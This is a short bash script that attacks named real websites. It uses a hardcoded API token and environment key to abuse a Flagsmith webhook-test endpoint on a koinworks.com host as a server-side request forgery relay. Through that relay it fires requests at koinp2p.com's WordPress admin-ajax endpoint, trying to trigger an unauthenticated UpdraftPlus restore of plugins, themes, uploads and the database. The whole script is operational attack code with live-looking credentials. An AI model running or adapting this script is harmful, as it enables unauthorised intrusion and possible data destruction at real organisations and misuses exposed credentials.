#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

# Use the account from v8 which has working env
KEY="52345f7dcce985368c2efdbb96648f4e0da25a40"
EKEY="XmdKkEuf4ysw9pmxoLw9vc"

echo "IP: $(curl -s https://ifconfig.me)"

# SINGLE targeted SSRF: koinp2p admin-ajax with updraft_ajaxrestore
# + action=updraft_restore + backup_timestamp and updraft_restore components
# This should trigger the full nopriv restore chain
echo "=== UPDRAFT RESTORE CHAIN ==="
curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"url":"https://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_ajaxrestore&updraftplus_ajax_restore=start_ajax_restore&action=updraft_restore&backup_timestamp=9999999999&updraft_restore[]=plugins&updraft_restore[]=themes&updraft_restore[]=uploads&updraft_restore[]=others&updraft_restore[]=db"}' \
  --max-time 30
echo ""

# Test 2: Check if updraft created a restore job
echo "=== RESTORE CONTINUE ==="
curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"url":"https://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_ajaxrestore_continue&updraftplus_ajax_restore=continue_ajax_restore&job_id=test123"}' \
  --max-time 30
echo ""
